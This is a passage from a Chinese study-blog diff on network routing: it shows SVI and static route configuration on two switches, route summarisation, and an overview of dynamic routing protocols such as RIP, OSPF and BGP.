+<li>SW1、SW2的SVI与静态路由配置 <ul>
+<li>通过给VLAN10、20、30、40、800配置IP地址并no shutdown，使交换机具有多个虚拟的路由口 </li>
+<li>VLAN10、20、30、40的SVI地址可以分别作为相应VLAN内PC机的默认网关 </li>
+<li>（方案2）SW1与SW2的G0&#x2F;5接口可以转化为三层路由接口，作为互联地址 </li>
+<li>通过配置静态路由，使不同VLAN、不同IP网络间的PC机能互相通信</li>
+</ul>
+</li>
+</ul>
+<pre class="language-none"><code class="language-none">SW1(config)#interface vlan 10
+SW1(config-if)#ip address 192.168.1.254 255.255.255.0
+SW1(config)#interface vlan 20
+SW1(config-if)#ip address 192.168.2.254 255.255.255.0 
+SW1(config)#interface GigabitEthernet 0&#x2F;5
+SW1(config-if)#no switchport
+SW1(config-if)# ip address 10.0.0.1 255.255.255.252
+SW1(config)#ip route 192.168.3.0 255.255.255.0 10.0.0.2
+SW1(config)#ip route 192.168.4.0 255.255.255.0 10.0.0.2 </code></pre>
+
+<pre class="language-none"><code class="language-none">SW2(config)#interface vlan 30
+SW2(config-if)#ip address 192.168.3.254 255.255.255.0 
+SW2(config)#interface vlan 40
+SW2(config-if)#ip address 192.168.4.254 255.255.255.0 
+SW2(config)#interface GigabitEthernet 0&#x2F;5
+SW2(config-if)#no switchport
+SW2(config-if)# ip address 10.0.0.2 255.255.255.252
+SW2(config)#ip route 192.168.1.0 255.255.255.0 10.0.0.1
+SW2(config)#ip route 192.168.2.0 255.255.255.0 10.0.0.1</code></pre>
+
+<h3 id="静态路由配置案例5-——-汇总路由"><a href="#静态路由配置案例5-——-汇总路由" class="headerlink" title="静态路由配置案例5 —— 汇总路由"></a>静态路由配置案例5 —— 汇总路由</h3><ul>
+<li>路由汇总的定义：把多条路由条目汇总成一条路由条目。</li>
+<li>路由汇总的作用：收缩路由表，减轻路由器的负担，提高路由器的转发效率 </li>
+<li>分别在R1和R2上仅配置一条静态路由（不能使用默认路由），使所有PC能互相通信</li>
+</ul>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620104258.png" alt="20" loading="lazy"></p>
+<ul>
+<li>配置R1路由器</li>
+</ul>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620104303.png" alt="21" loading="lazy"></p>
+<h4 id="静态路由配置案例5-——-路由汇总的限制"><a href="#静态路由配置案例5-——-路由汇总的限制" class="headerlink" title="静态路由配置案例5 —— 路由汇总的限制"></a>静态路由配置案例5 —— 路由汇总的限制</h4><ul>
+<li>在特定场景下，才可实施路由汇总</li>
+<li>在以下的场景中，在R2上不能做路由汇总</li>
+</ul>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620104308.png" alt="22" loading="lazy"></p>
+<h2 id="动态路由"><a href="#动态路由" class="headerlink" title="动态路由"></a>动态路由</h2><h3 id="动态路由协议"><a href="#动态路由协议" class="headerlink" title="动态路由协议"></a>动态路由协议</h3><ul>
+<li>目前网络项目中的主流路由协议有：RIP、OSPF、BGP</li>
+</ul>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620104312.png" alt="23" loading="lazy"></p>
+<ul>
+<li>这是路由器用来计算、维护网络路由信息的协议，通常有一定的算法，工作在传输层或应用层 <ul>
+<li>RIP基于UDP，端口号520 </li>
+<li>OSPF基于IP，协议号89 </li>
+<li>BGP基于TCP，端口号179</li>
+</ul>
+</li>
+<li>路由协议工作机制的四个主要步骤： <ul>
+<li>邻居发现：路由器通过发送广播或组播报文的方式发现网络中的邻居，并基于特定参数来建立邻居关系。 </li>
+<li>路由交换：每台路由器将自己已知的路由相关信息发给相邻路由器。 </li>
+<li>路由计算：每台路由器运行某种算法，计算出最终的路由表。</li>
+<li>路由维护：路由器之间通过周期性地发送协议报文来维护邻居信息。</li>
+</ul>
+</li>
+</ul>
+<h3 id="动态路由基本概念"><a href="#动态路由基本概念" class="headerlink" title="动态路由基本概念"></a>动态路由基本概念</h3><ul>
+<li>衡量路由协议的主要指标 <ul>
+<li>协议计算的正确性：协议使用的算法能够计算出最优的路由，且正确无自环。 </li>
+<li>路由收敛速度：当网络的拓扑结构发生变化之后，能够迅速感知并及时更新相应的路由信息。 </li>
+<li>协议占用系统开销：协议自身占用的资源开销（内存、CPU、网络带宽)。</li>
+<li>协议自身的安全性：协议自身不易受攻击，有安全机制。 </li>
+<li>协议适用网络规模：协议可以应用在何种拓扑结构和规模的网络中。</li>
+</ul>
+</li>
+</ul>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620104316.png" alt="24" loading="lazy"></p>
+<h3 id="动态路由协议的分类"><a href="#动态路由协议的分类" class="headerlink" title="动态路由协议的分类"></a>动态路由协议的分类</h3><ul>
+<li>按照管理范围分类 <ul>
+<li>IGP（内部网关协议）：RIP、EIGRP、OSPF、IS-IS（园区网常用协议） </li>
+<li>EGP（外部网关协议）：BGP（主要应用在金融，政府电子政务网，运营商网络）</li>
+</ul>
+</li>
+<li>按照算法分类 <ul>
+<li>距离矢量路由协议：RIP、BGP </li>
+<li>链路状态路由协议：OSPF、IS-IS</li>
+</ul>
+</li>
+</ul>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620104320.png" alt="25" loading="lazy"></p>
+<h3 id="距离矢量路由协议"><a href="#距离矢量路由协议" class="headerlink" title="距离矢量路由协议"></a>距离矢量路由协议</h3><ul>
+<li>路由以矢量（距离、方向）的方式通告出去</li>
+<li>距离矢量协议直接传送各自的路由表信息 <ul>
+<li>每台路由器从邻居路由器直接获取路由信息，并将这些路由信息连同自己的本地路由信息发送给其他邻居</li>
+<li>如此逐跳传递，达到全网同步。每个路由器都不了解整个网络拓扑 </li>
+<li>它们只知道与自己直接相连的网络情况，并根据从邻居得到的路由信息更新自己的路由</li>
+</ul>
+</li>
+</ul>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620104350.png" alt="26" loading="lazy"></p>
+<h3 id="链路状态路由协议"><a href="#链路状态路由协议" class="headerlink" title="链路状态路由协议"></a>链路状态路由协议</h3><ul>
+<li>基于Dijkstra（迪克斯特拉）算法的最短路径优先（SPF）算法，比距离矢量路由协议复杂 </li>
+<li>路由器并不向邻居直接传递“路由表项”，而是通告给邻居链路状态 </li>
+<li>链路状态信息包括：接口IP地址和掩码、网络类型、链路开销、链路上所有相邻路由器</li>
+<li>运行该路由协议的路由器不是简单地从相邻的路由器学习路由，而是把路由器分成区域，收集区域的所有 的路由器的链路状态信息，根据状态信息和SPF算法生成网络拓扑结构，每一个路由器再根据拓扑结构计 算出路由</li>
+</ul>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620104354.png" alt="27" loading="lazy"></p>
 ]]></content>
       <categories>
         <category>学习</category>
